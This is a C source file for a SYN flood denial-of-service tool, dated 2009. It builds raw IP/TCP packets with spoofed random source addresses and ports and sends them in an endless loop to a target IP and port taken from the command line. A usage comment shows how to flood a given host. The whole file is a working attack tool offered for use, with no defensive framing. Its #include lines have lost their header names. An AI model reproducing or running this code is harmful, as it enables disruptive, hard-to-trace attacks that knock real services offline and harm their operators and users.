/* syn flood by wqfhenanxc.
 * random soruce ip and random sourec port.
 * use #include instead of for my own system reason.
 * usage :eg. to flood port 8080 on ip 246.245.167.45   ./synflood 246.245.167.45 8080
 * any question mail to wqfhenanxc@gmail.com 
 * 2009.6.12
 */
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
//#include "synflood.h"

//#define DEFAULT_DPORT 80
//#define SPORT 8888

#define getrandom(min, max) ((rand() % (int)(((max)+1) - (min))) + (min))

void send_tcp(int sockfd,struct sockaddr_in *addr);
unsigned short checksum(unsigned short *buffer, int size);
unsigned short random_port(unsigned short minport,unsigned short maxport);
void random_ip(char *str);

int main(int argc,char **argv){
  int sockfd;
  struct sockaddr_in addr;
  //int dport;
  int on=1;
  if(argc!=3){
     printf("usage: \n");
     exit(1);
  }
  bzero(&addr,sizeof(struct sockaddr_in));
  addr.sin_family=AF_INET;
  addr.sin_port=htons(atoi(argv[2]));
  //addr.sin_addr.s_addr=inet_aton(argv[1]);
  inet_pton(AF_INET,argv[1],&addr.sin_addr);
  /*if(inet_aton(argv[1],&addr.sin_addr)==0){
     host=gethostbyname
  }*/
  sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP);
  if(sockfd<0){
     printf("Socket error!\n");
     exit(1);
  }
  setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on));
  while(1){
     send_tcp(sockfd,&addr);
  }
  return 0;
}

void send_tcp(int sockfd,struct sockaddr_in *addr){
  char buff[100];
  struct iphdr  ip_header;
  struct tcphdr tcp_header;
  unsigned short source_port=random_port(1024,5000);
  char ip_str[50];
  struct in_addr ip;

  random_ip(ip_str);
  if(inet_aton(ip_str,&ip)==0){
     printf("inet_aton error!\n");
     exit(1);
  }
  bzero(buff,100);
  
  //ip_header=(struct iphdr*)buff;
  ip_header.version=4;
  ip_header.ihl=5;
  ip_header.tos=0;
  ip_header.tot_len=sizeof(struct iphdr)+sizeof(struct tcphdr);
  ip_header.id=htons(random());
  ip_header.frag_off=0;
  ip_header.ttl=30;
  ip_header.protocol=IPPROTO_TCP;
  ip_header.check=0;
  ip_header.saddr=ip.s_addr;
  ip_header.daddr=addr->sin_addr.s_addr;

  //tcp_header=(struct tcphdr*)(buff+sizeof(struct iphdr));
  tcp_header.source=htons(source_port);
  tcp_header.dest=addr->sin_port;
  tcp_header.seq=rand();
  tcp_header.doff=sizeof(struct tcphdr)/4;
  tcp_header.ack_seq=0;
  tcp_header.res1=0;
  tcp_header.fin=0;
  tcp_header.syn=1;
  tcp_header.rst=0;
  tcp_header.psh=0;
  tcp_header.ack=0;
  tcp_header.urg=0;
  tcp_header.window=htons(65535);
  tcp_header.check=0;
  tcp_header.urg_ptr=0;

  
  //send_tcp_segment(&ip_header,&tcp_header,"",0);
  struct{
     unsigned long saddr;
     unsigned long daddr;
     char mbz;
     char ptcl;
     unsigned short tcpl;
  }psd_header;

  psd_header.saddr=ip_header.saddr;
  psd_header.daddr=ip_header.daddr;
  psd_header.mbz=0;
  psd_header.ptcl=IPPROTO_TCP;
  psd_header.tcpl=htons(sizeof(struct tcphdr));

  memcpy(buff,&psd_header,sizeof(psd_header));
  memcpy(buff+sizeof(psd_header),&tcp_header,sizeof(tcp_header));
  //memcpy(buf+sizeof(psd_header)+sizeof(tcp_header),data,dlen);
  //memset(buf+sizeof(psd_header)+sizeof(tcp_header)+dlen,0,4);
  tcp_header.check=checksum((unsigned short*)buff,sizeof(psd_header)+sizeof(tcp_header));
  
  memcpy(buff,&ip_header,4*ip_header.ihl);
  memcpy(buff+4*ip_header.ihl,&tcp_header,sizeof(tcp_header));
  //memcpy(buf+4*ip_header.ihl+sizeof(tcp_header),data,dlen);
  //memset(buf+4*ip_header.ihl+sizeof(tcp_header)+dlen,0,4);
  ip_header.check=checksum((unsigned short*)buff,4*ip_header.ihl+sizeof(tcp_header));
   
  // send_seq=SEQ+1+strlen(buf);
  
  sendto(sockfd,buff,sizeof(struct iphdr)+sizeof(struct tcphdr),0,
             (struct sockaddr*)addr,sizeof(struct sockaddr_in));
 
}


unsigned short checksum(unsigned short *buffer, int size){

  unsigned long cksum=0;

        while(size >1) {

            cksum+=*buffer++;

            size -=sizeof(unsigned short);

        }

        if(size ) cksum += *(unsigned char*)buffer;  //..buffer..size..2......

        cksum = (cksum >> 16) + (cksum & 0xffff);

        cksum += (cksum >>16);

        return (unsigned short)(~cksum);

}

unsigned short random_port(unsigned short minport,unsigned short maxport){
  /*struct time stime;
  unsigned seed;
  gettime(&stime);
  seed=stime.ti_hund*stime.ti_min*stime.ti_hour;
  srand(seed);*/
  srand((unsigned)time(NULL));
  return(getrandom(minport,maxport));
}

void random_ip(char *str){
  int a,b,c,d,i=0;
  static long j=0;
  srand((unsigned)time(NULL)+(i++)+(j++));
  a=getrandom(0,255);
  srand((unsigned)time(NULL)+(i++)+(j++));
  b=getrandom(0,255);
  srand((unsigned)time(NULL)+(i++)+(j++));
  c=getrandom(0,255);
  srand((unsigned)time(NULL)+(i++)+(j++));
  d=getrandom(0,255);
  sprintf(str,"%d.%d.%d.%d",a,b,c,d);
  printf("%s\n",str);  
}
